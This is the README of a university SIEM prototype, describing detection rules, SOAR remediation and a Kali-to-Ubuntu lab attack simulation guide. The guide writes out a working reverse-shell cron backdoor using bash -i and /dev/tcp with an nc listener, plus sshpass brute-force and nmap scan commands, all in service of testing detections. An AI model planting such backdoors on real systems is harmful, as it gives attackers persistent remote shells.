# SentinelAI

A full-stack AI-assisted SIEM (Security Information and Event Management) prototype built as a university cybersecurity project. SentinelAI ingests real Linux logs from a virtual machine, detects attacks using a 14-rule detection engine, correlates alerts into incidents, scores anomalies with ML, and presents everything in a live SOC dashboard with GeoIP enrichment, threat intelligence, SOAR remediation, and team activity analytics.

---

## Features

### Core Detection & Ingestion
- **Live log ingestion** — log agent on Ubuntu VM streams `auth.log` and `syslog` to the SIEM in real time via HTTP POST; WebSocket broadcasts updates to the dashboard instantly
- **14-rule detection engine** — covers brute force, user enumeration, privilege escalation, port scans, cron backdoors, reverse shells, sudo failures, new account creation, and more
- **Professional severity tuning** — 4-band severity (Low / Medium / High / Critical) with per-rule score ceilings so the SIEM is never over-sensitive
- **Cross-session correlation** — detects attack chains that span multiple SSH connections (e.g. brute force in one session → sudo escalation in a later session from the same IP)
- **Smart incident deduplication** — groups alerts by source IP + attack type only, ignoring username variations — one incident per attack pattern per IP
- **Alert correlation** — groups related alerts into incidents using attack-chain pattern matching (7 patterns)
- **ML anomaly scoring** — Isolation Forest trained per-run to flag statistically abnormal sessions
- **Risk scoring** — final 0–100 score per alert and incident combining base score + anomaly bonus + correlation bonus
- **Duplicate event suppression** — within-batch deduplication prevents the same log line from being processed multiple times

### Threat Intelligence (AbuseIPDB)
- **AbuseIPDB integration** — every incident's source IP is automatically checked against AbuseIPDB for reputation data
- **Threat Intelligence panel** — incident modal shows abuse confidence score, total reports, ISP, TOR exit node status, abuse categories (e.g. SSH Brute-Force, Port Scan), and last reported date
- **Known Threat badge** — 🔴 Threat badge shown next to source IPs scoring ≥ 75% confidence in Alerts and Incidents tables
- **Suspicious badge** — ⚠ Suspicious badge shown for IPs scoring 25–74% confidence
- **24-hour result cache** — AbuseIPDB results cached in the database to minimise API quota usage
- **Auto-incident creation** — IPs scoring ≥ 75% automatically generate a Threat Intelligence incident (deduplicated — one open incident per IP)
- **Smart auto-watchlisting** — IPs scoring ≥ 75% are automatically added to the watchlist; if an IP was manually removed and re-checked, threat intel overrides the removal and re-adds it
- **Real-time watchlist updates** — watchlist page updates instantly via WebSocket when threat intel flags a new high-abuse IP — no refresh required

### SOAR (Security Orchestration, Automation and Response)
- **Auto-generated remediation commands** — each incident modal shows a set of ready-to-run Ubuntu shell commands tailored to the specific attack type (brute force, port scan, reverse shell, privilege escalation, etc.)
- **Real IP and username filled in** — commands are pre-populated with the actual attacker IP and targeted username from the incident
- **SSH auto-execute** — analysts can click **Run** on any SOAR command to execute it directly on the SIEM's target host via SSH; stdout/stderr shown in a result modal
- **SSH config panel** — Settings page has a dedicated SSH Config section; host, port, username, and private key path are saved to the database and persist across restarts
- **Test Connection** — one-click SSH connection test from the Settings page; shows live output from the remote host
- **Passwordless SSH** — uses RSA key authentication (no password prompts during automated execution)
- **Copy per command** — one-click copy button for each individual command
- **Copy All** — copies the full command block at once
- **Mark as Executed** — analysts can mark commands as executed; logged to the audit trail with username and timestamp
- **MTTD (Mean Time to Detect)** — Overview page shows average minutes between first alert and incident creation
- **MTTR (Mean Time to Respond)** — Overview page shows average minutes between incident creation and close

### Team Activity Metrics
- **Team Activity panel** — Overview page shows a per-analyst performance table
- **Incidents closed** — count of incidents each analyst has closed
- **Incidents assigned** — count of incidents assigned to each analyst
- **Notes added** — count of investigation notes written by each analyst
- **SOAR executed** — count of remediation commands marked as executed per analyst
- **Avg resolution time** — average time each analyst takes to close an incident (minutes or hours)
- **TOP analyst badge** — highlights the most active analyst on the leaderboard

### MITRE ATT&CK Mapping
- **Technique tagging** — every detection rule is mapped to its corresponding MITRE ATT&CK technique ID and name (e.g. T1110 — Brute Force, T1053 — Scheduled Task/Job)
- **Clickable badges** — technique badges in the Alerts table link directly to the official MITRE ATT&CK page for that technique
- **Stored in DB** — MITRE technique IDs stored as JSON in the alerts table for querying and export

### Real-time Updates (WebSocket)
- **Alerts page** — new alerts appear instantly during an attack without any refresh; debounced to avoid hammering the API during Hydra storms
- **Incidents page** — new incidents (including auto-created Threat Intelligence incidents) appear in real time
- **Watchlist page** — IP automatically appears when threat intel flags it, no refresh needed
- **Live feed** — Overview page live event feed streams events and alerts via WebSocket with auto-reconnect and keep-alive ping
- **Robust WS connections** — all listeners reconnect automatically after 3 seconds if the backend restarts

### Dashboard & Visualisation
- **GeoIP enrichment** — every source IP resolved to country + city via `ip-api.com` with in-memory caching; flag emoji and city shown in Alerts and Incidents tables
- **Attack Map** — live world map showing attacker source IPs as colour-coded dots (Critical = red, High = orange, Medium = yellow, Low = green); Threat Intelligence IPs shown as **purple** markers with a ⚠ badge
- **Attack Map filter** — Resolved Attackers table has a live search bar (filter by IP, country, city, ISP) and a severity dropdown filter; results update instantly as you type
- **Attack Map zoom & pan** — scroll to zoom up to 12×; drag to pan; "Reset Zoom" button appears in the toolbar when zoomed in; hint text shown at default zoom; all gestures are crash-proof (DOM-based transform with zero React re-renders during interaction)
- **Attack Map local GeoJSON rendering** — world landmasses rendered from a local `world.geojson` file as SVG paths; no external image dependency; equirectangular projection perfectly aligned with the GeoIP coordinate system
- **Attack Map TI integration** — high-abuse IPs from the threat intel cache appear on the map alongside alert IPs, with a Source column distinguishing `Threat Intel` from `Alerts`
- **Attack Map legend** — purple Threat Intel entry added to the map legend
- **Risk trend sparkline** — Overview page shows average and peak risk scores over the last 7 days
- **Overview auto-refresh** — dashboard refreshes every 30 seconds with a live "last updated X seconds ago" countdown
- **Live feed severity filter** — filter the live event feed by All / Alerts only / Critical / High+ to cut noise during demos

### Incident Management
- **Incident response playbook** — each incident shows a tailored checklist of response steps derived from its specific alert rules (contain, block, investigate, remediate, monitor, escalate)
- **SOAR remediation commands** — pre-built Ubuntu shell commands per incident type with real IP/username filled in
- **Investigation notes** — add timestamped notes per incident; note count badge shown live in the incidents table
- **Status workflow** — Open → Investigating → Closed with audit-logged status changes
- **Incident assignment** — assign incidents to analysts; recorded in audit log
- **SLA timer** — each open incident shows how long it has been open; turns red after 24 hours
- **PDF incident report** — export a full incident report for any incident

### IP Watchlist
- **Dedicated Watchlist page** — `/watchlist` route with IP table, reason, added date, added-by, and remove button
- **Manual watchlist management** — admins can add IPs with a preset reason dropdown or custom reason; removals also supported
- **Auto-watchlisting** — IPs that trigger Critical/High alerts are automatically added to the watchlist
- **Threat intel auto-watchlisting** — IPs with AbuseIPDB confidence ≥ 75% are auto-added; if manually removed and re-queried, threat intel overrides the removal and re-adds them
- **Real-time updates** — watchlist page updates live via WebSocket when TI flags a new IP
- **Watchlist badge** — 🚫 icon shown next to watchlisted IPs in the Alerts and Incidents tables
- **Audit logging** — all watchlist additions and removals recorded in audit log

### Multi-Factor Authentication (MFA)
- **TOTP-based MFA** — industry-standard RFC 6238 Time-based One-Time Passwords; compatible with Google Authenticator, Authy, and any TOTP app
- **QR code setup** — Settings page generates a scannable QR code; manual base32 secret key also shown for manual entry
- **Activation confirmation** — MFA is only activated after the user enters a valid TOTP code from their authenticator app, ensuring the setup succeeded
- **Two-step login flow** — when MFA is enabled, the login endpoint returns a short-lived 5-minute challenge token; the dashboard shows a dedicated TOTP screen; the full session JWT is only issued after a correct code is submitted
- **Disable requires verification** — disabling MFA requires entering a valid current code, preventing accidental or unauthorised lockout
- **Per-user** — any user (admin or analyst) can independently enable/disable MFA on their own account from the Settings page
- **Audit logged** — MFA enable and disable events are recorded in the audit log with username and timestamp
- **Zero external dependencies** — powered by `pyotp`; no third-party auth service required

### User & Admin Features
- **FastAPI REST backend** — full CRUD endpoints for events, alerts, incidents, dashboard stats, GeoIP, threat intel, and SOAR
- **JWT authentication** — register/login with bcrypt password hashing; first user auto-assigned admin role
- **Multi-factor authentication** — TOTP MFA available to all users (see MFA section above)
- **Role-based access** — `admin` (full access) and `analyst` (read + update incidents)
- **Rule suppression with expiry** — admins can suppress noisy rules directly from the Alerts page with an optional expiry time (1h / 6h / 24h / 7d / Forever); rules auto-unsuppress when the timer expires — no manual cleanup required
- **Alert Tuning page** — dedicated `/alert-tuning` page (admin only) to adjust detection thresholds and suppress rules without touching code; changes persist in the database across restarts
- **False positive marking** — analysts can mark any alert or incident as a false positive with a reason (e.g. "Test / lab traffic", "Known scanner"); FP records are dimmed with a yellow **FP** badge; FP status survives page navigation and restarts
- **FP filtering** — Alerts and Incidents pages both have an "All / Real attacks only / False positives" dropdown filter so analysts can focus their queue
- **FP rate metric** — Overview dashboard shows Alert FP rate %, Incident FP rate %, FPs marked this week, and top rules generating false positives with mini bar charts
- **Audit log** — tracks all actions: status changes, assignments, role changes, note additions, watchlist add/remove, SOAR executed, MFA changes, FP marked/cleared, threshold tuned/reset, rule suppressed/unsuppressed, password reset/changed, user created/deleted — filterable by categorised action groups (Incidents/Alerts, Rules, Watchlist/SOAR, User Management) with CSV export; sensitive user-management entries (password resets, role changes, MFA events) are hidden from analysts and only visible to admins
- **User management page** — admins can create new users, change roles (admin ↔ analyst) with a confirm dialog, reset any user's password, and delete accounts — all changes audit-logged
- **Email alerting** — High and Critical incidents trigger automatic email notifications via SMTP; configurable via environment variables; gracefully skipped if SMTP is not configured
- **Browser notifications** — Critical and High alerts fire desktop notifications when the tab is in the background
- **Copy IP button** — one-click clipboard copy next to every source IP in Alerts and Incidents tables
- **React SOC dashboard** — Overview, Incidents, Alerts, Events, Attack Map, Watchlist, Audit Log pages with live filtering and CSV export
- **Onboarding modal** — 8-step welcome tour shown automatically on first login; covers every page with description and practical tips; per-user dismissal stored in `localStorage`
- **Alerts rule filter** — dropdown to filter alerts by specific detection rule name, dynamically populated from loaded alerts; stacks with severity filter and search
- **Events dynamic type filter** — event type dropdown populated live from the database so all types (including `sudo_session_opened`, `sudo_session_closed`, etc.) always appear
- **137 unit tests** — covering correlation, risk scoring, and anomaly scoring modules

---

## Project Structure

```
sentinelai/
├── backend/
│   ├── main.py                  # FastAPI entry point + startup
│   ├── config.py                # Constants: paths, thresholds, severity bands
│   ├── auth.py                  # JWT + bcrypt auth, user CRUD, TOTP MFA helpers
│   ├── collector.py             # Reads log files, dispatches to parsers
│   ├── parser_auth.py           # Parses /var/log/auth.log
│   ├── parser_syslog.py         # Parses /var/log/syslog (UFW, cron, syslog)
│   ├── parser_custom.py         # Parses custom_security.log (JSON)
│   ├── normalizer.py            # build_event() — common event schema
│   ├── aggregator.py            # Groups events into sessions by IP/user/time
│   ├── detection.py             # 14-rule detection engine with MITRE ATT&CK mapping
│   ├── correlation.py           # Links alerts into incidents (7 patterns)
│   ├── anomaly_scoring.py       # Isolation Forest ML scoring
│   ├── risk_scoring.py          # Final 0–100 risk score + severity + ceilings
│   ├── geoip.py                 # GeoIP lookup via ip-api.com with cache
│   ├── emailer.py               # SMTP email alerts for High/Critical incidents
│   ├── storage.py               # SQLite database layer (10 tables)
│   ├── schemas.py               # Pydantic API models
│   ├── utils.py                 # Shared utilities
│   └── routers/
│       ├── auth.py              # /api/auth — register, login, me, users, MFA endpoints
│       ├── dashboard.py         # /api/dashboard — summary, charts, MTTD/MTTR, team activity
│       ├── events.py            # /api/events
│       ├── alerts.py            # /api/alerts + rule suppression + false positive marking
│       ├── tuning.py            # /api/tuning — threshold overrides + suppress per rule
│       ├── incidents.py         # /api/incidents + notes + assignment
│       ├── geoip.py             # /api/geoip — lookup, bulk, attack map IPs
│       ├── audit.py             # /api/audit — audit log + CSV export + POST logging
│       ├── watchlist.py         # /api/watchlist + playbook + SOAR commands
│       ├── threatintel.py       # /api/threatintel — AbuseIPDB lookup + cache + WS broadcast
│       ├── soar_execute.py      # /api/soar/execute + /ssh-config + /ssh-test
│       └── live.py              # /api/live/ingest (POST) + /api/live/ws (WS)
│                                # /api/events/types — distinct event types from DB
├── frontend/
│   └── dashboard/               # Vite + React + Tailwind CSS
│       └── src/
│           ├── App.jsx          # Routing, auth state, JWT verification
│           ├── api.js           # All API calls with auth headers
│           ├── components/
│           │   ├── LiveFeed.jsx         # WebSocket feed with severity filter
│           │   ├── Sidebar.jsx          # Navigation sidebar
│           │   ├── Panel.jsx            # Reusable card panel
│           │   ├── Badge.jsx            # Severity/status badges
│           │   ├── ScoreBar.jsx         # Risk score bar
│           │   ├── NotificationBell.jsx # Browser notification bell
│           │   └── OnboardingModal.jsx  # First-login 8-step platform tour
│           └── pages/
│               ├── Login.jsx
│               ├── Register.jsx
│               ├── Overview.jsx         # MTTD/MTTR cards, team activity, risk trend
│               ├── Incidents.jsx        # Threat intel panel, SOAR commands, playbook
│               ├── Alerts.jsx           # Threat badges, MITRE tags, rule filter, GeoIP, FP marking
│               ├── AlertTuning.jsx      # Alert tuning UI (thresholds + suppress)
│               ├── Events.jsx
│               ├── AttackMap.jsx        # Live world map + attacker table
│               ├── Watchlist.jsx        # IP watchlist management page
│               ├── AuditLog.jsx         # Audit log with action filter + CSV export
│               └── IncidentReport.jsx   # PDF-printable incident report
├── database/                    # sentinelai.db (auto-created on startup)
├── data/logs/                   # Log files from Ubuntu VM
│   ├── auth.log                 # Real SSH attack logs from Kali→Ubuntu
│   ├── syslog                   # Real system logs from Ubuntu
│   └── custom_security.log      # Custom JSON security events
├── models/                      # Trained Isolation Forest model (.pkl)
├── scripts/
│   ├── run_pipeline.py          # Batch pipeline: collect → detect → store
│   └── test_auth.py             # Auth endpoint validation script
└── tests/
    ├── test_correlation.py      # 22 tests
    ├── test_risk_scoring.py     # 28 tests
    └── test_anomaly_scoring.py  # 27 tests
```

---

## Setup

### Prerequisites
- Python 3.10+
- Node.js 18+

### Backend

```bash
# 1. Create and activate virtual environment
python -m venv venv
venv\Scripts\activate          # Windows
# source venv/bin/activate     # Linux/macOS

# 2. Install dependencies
pip install -r requirements.txt

# 3. Start the API server
cd backend
python -m uvicorn main:app --host 0.0.0.0 --port 8000
```

### Frontend

```bash
cd frontend/dashboard
npm install
npm run dev
# Opens at http://localhost:5173
```

### Ingest logs from file (batch mode)

```bash
# From the project root
python scripts/run_pipeline.py --reset
```

> **Note (Windows):** If uvicorn fails with `WinError 10013` (socket permission denied), run the terminal as Administrator or add a Windows Firewall inbound rule for `python.exe`.

---

## Live Ingestion (Real-time mode)

A log agent runs on the Ubuntu VM and streams logs to the SIEM as they are written. The dashboard updates in real time via WebSocket.

### Log agent setup on Ubuntu VM

The agent reads `/var/log/auth.log` and `/var/log/syslog` using `tail -F` and POSTs new lines to the SIEM every few seconds:

```bash
# On Ubuntu VM — install the agent dependencies
pip3 install requests

# Run the agent (replace SIEM_IP with your Windows machine IP)
python3 log_agent.py --host http://<SIEM_IP>:8000
```

The live feed is visible in real time on the **Overview** page under **Live Event Feed**.

---

## First Run — Creating your admin account

1. Open `http://localhost:5173` and click **Create an account**
2. The **first user registered** is automatically assigned the `admin` role
3. All subsequent registrations become `analyst`

**Email format:** must be `yourname1@sentinelai.com` (letters, dots, ends with a number)

**Password requirements:** 8+ characters, uppercase, number, special character

---

## Running Tests

```bash
python -m pytest tests/ -v
# 137 passed
```

---

## Alert Tuning & False Positive Triage

SentinelAI separates three analyst tools for managing alert quality:

| Tool | Purpose | Effect on future alerts |
|------|---------|------------------------|
| **False Positive** | Label a specific alert/incident as not a real threat | None — new alerts still generate |
| **Suppress rule** | Silence a rule entirely | Alerts from that rule are hidden |
| **Threshold tuning** | Raise/lower the count needed to fire a rule | Changes when the rule fires |

### False Positive workflow
1. Click the **ShieldOff** icon on any alert/incident row
2. Pick a reason from the modal (e.g. "Test / lab traffic")
3. Click **Confirm** — the row immediately dims with a yellow **FP** badge
4. Use the **False positives** dropdown filter to review all FP records
5. Click the yellow icon again to clear the FP label

> Marking an alert as FP does **not** prevent the same rule from firing again. Use rule suppression or threshold tuning to prevent future alerts.

### Alert Tuning page (`/alert-tuning`)
- **Threshold-tunable rules** — adjust the count/hour threshold for brute force, enumeration, sudo failures, port scans, and suspicious login time
- **Event-based rules** — suppress-only controls for rules that fire on a single event (success after failures, privilege escalation, reverse shell, etc.)
- All changes persist in the database; displayed with an **Overridden** badge when non-default
- Reset any rule back to its default with one click
- Every threshold change and reset is **audit-logged** with the analyst's username, the rule name, old → new value, and timestamp — visible in the Audit Log under the "Threshold Changed" / "Threshold Reset" filters

---

## Detection Rules

| Rule | Severity | Trigger condition |
|------|----------|-------------------|
| `reverse_shell_cron` | 🔴 Critical | Cron job executes a command with `/dev/tcp`, `bash -i`, `nc`, `mkfifo`, etc. |
| `success_after_failures` | 🔴 Critical | Successful SSH login after ≥5 failed attempts from same IP (cross-session) |
| `sudo_after_suspicious_login` | 🔴 Critical | Sudo used from an IP that had prior brute-force failures (cross-session) |
| `privilege_after_login` | 🔴 Critical | Sudo executed in the same session as a successful SSH login |
| `new_user_created` | 🟠 High | `useradd` / `adduser` executed via sudo |
| `cron_modification` | 🟠 High | Cron schedule edited via sudo |
| `brute_force_ssh` | 🟠 High | ≥5 wrong-password failures on a real username from same IP |
| `repeated_sudo_failures` | 🟠 High | ≥5 sudo authentication failures |
| `port_scan_detected` | 🟡 Medium /  High | 3–7 blocked ports = Medium (simple scan); 8+ blocked ports = High (aggressive scan) |
| `sensitive_file_access` | 🟠 High | Custom security log events (file access, sensitive commands) |
| `invalid_user_enumeration` | 🟡 Medium | ≥4 SSH attempts with non-existent usernames from same IP (cross-session) |
| `suspicious_login_time` | 🟡 Medium | SSH login activity between 22:00 – 06:00 |
| `system_service_anomaly` | 🟢 Low | Service failures or kernel errors in syslog |
| `ssh_login_success` | 🟢 Low | Any successful SSH login (informational) |

### Score ceilings

Certain rules are hard-capped so ML anomaly bonuses cannot escalate them into a higher severity band:

| Rule | Max score | Reason |
|------|-----------|--------|
| `ssh_login_success` | 29 (Low) | Informational only |
| `system_service_anomaly` | 29 (Low) | Background noise |
| `suspicious_login_time` | 59 (Medium) | Reconnaissance indicator |
| `invalid_user_enumeration` | 59 (Medium) | Reconnaissance indicator |
| `port_scan_detected` | 79 (High) | Real threat, not confirmed compromise |
| `repeated_sudo_failures` | 79 (High) | Real threat, not confirmed compromise |

---

## Attack Simulation Guide (Kali → Ubuntu)

Replace `yourpassword` with your Ubuntu account password. Ubuntu IP: `192.168.56.130`.

| Step | Command (on Kali) | Expected alert | Severity |
|------|-------------------|----------------|----------|
| 1 | `ssh majeed@192.168.56.130` (correct password) | `ssh_login_success` | 🟢 Low |
| 2 | `ssh fakeuser1-4@192.168.56.130` (4 different fake users) | `invalid_user_enumeration` | 🟡 Medium |
| 3 | 5× `sshpass -p wrongpass ssh majeed@192.168.56.130` | `brute_force_ssh` | 🟠 High |
| 4 | `nmap -sS -p 1-1000 192.168.56.130` | `port_scan_detected` | 🟠 High |
| 5 | SSH in + 5× `echo x \| sudo -S id` | `repeated_sudo_failures` | 🟠 High |
| 6 | SSH in + `sudo useradd -m backdooruser` | `new_user_created` | 🟠 High |
| 7 | 5× wrong SSH then correct SSH login | `success_after_failures` | 🔴 Critical |
| 8 | SSH in + `sudo whoami` (after prior failures) | `privilege_after_login` | 🔴 Critical |
| 9 | Add cron job with `bash -i >& /dev/tcp/...` on Ubuntu | `reverse_shell_cron` | 🔴 Critical |

### Reverse shell demo (step 9 detail)

```bash
# On Kali — start listener
nc -lvnp 4444

# On Ubuntu — plant backdoor cron
sudo bash -c 'echo "* * * * * root bash -i >& /dev/tcp/192.168.56.128/4444 0>&1" > /etc/cron.d/demo_rev'
# Wait 60 seconds — Ubuntu connects back to Kali listener
# SentinelAI fires Critical reverse_shell_cron alert

# Cleanup
sudo rm /etc/cron.d/demo_rev
```

---

## GeoIP & Attack Map

- Every alert's source IP is resolved to country and city using `ip-api.com` (free tier, cached in memory)
- Country flag emoji and city are shown in the **Alerts** and **Incidents** tables
- The **Attack Map** page shows a live SVG world map with colour-coded dots per attacker IP
- Private/LAN IPs (e.g. `192.168.x.x`) are displayed with a 🏠 home icon and labelled as `LAN`

---

## Email Alerting

Set these environment variables before starting the backend to enable email alerts for High and Critical incidents:

```bash
SENTINEL_SMTP_HOST=smtp.gmail.com
SENTINEL_SMTP_PORT=587
SENTINEL_SMTP_USER=your@gmail.com
SENTINEL_SMTP_PASSWORD=your_app_password
SENTINEL_ALERT_EMAIL=soc@yourorg.com,analyst@yourorg.com
SENTINEL_EMAIL_ENABLED=true   # set to false to disable without removing config
```

Emails are sent automatically when a new High or Critical incident is created (risk score ≥ 60). If SMTP is not configured the backend logs a warning and continues normally — email is fully optional.

---

## Role Permissions

| Feature | Analyst | Admin |
|---------|---------|-------|
| View dashboard, alerts, events, incidents | ✅ | ✅ |
| Update incident status, add notes | ✅ | ✅ |
| Assign incidents | ✅ | ✅ |
| Export incident PDF report | ✅ | ✅ |
| Mark alerts / incidents as false positive | ✅ | ✅ |
| Filter alerts / incidents by FP status | ✅ | ✅ |
| View watchlist | ✅ | ✅ |
| View audit log (operational entries) | ✅ | ✅ |
| View audit log (user management entries) | ❌ | ✅ |
| Enable / disable MFA on own account | ✅ | ✅ |
| Add / remove watchlist entries | ❌ | ✅ |
| Suppress detection rules (with expiry) | ❌ | ✅ |
| Tune alert thresholds (Alert Tuning page) | ❌ | ✅ |
| Configure SSH auto-execute | ❌ | ✅ |
| Create / delete users | ❌ | ✅ |
| Change user roles | ❌ | ✅ |
| Reset any user's password | ❌ | ✅ |

---

## Tech Stack

| Layer | Technology |
|-------|-----------|
| Backend | Python 3.10+, FastAPI, SQLite |
| Auth | JWT (python-jose), bcrypt (passlib), TOTP MFA (pyotp) |
| ML | Isolation Forest (scikit-learn), StandardScaler |
| GeoIP | ip-api.com (HTTP, in-memory cache) |
| Frontend | React 18, Vite, Tailwind CSS, Recharts, Lucide Icons |
| Real-time | WebSocket (FastAPI), log agent (`tail -F` + HTTP POST), debounced reload |
| Notifications | Browser Notifications API (desktop alerts for Critical/High) |
| SSH Automation | paramiko (SOAR auto-execute) |
| MFA | pyotp (RFC 6238 TOTP) |
| Testing | pytest (137 tests) |
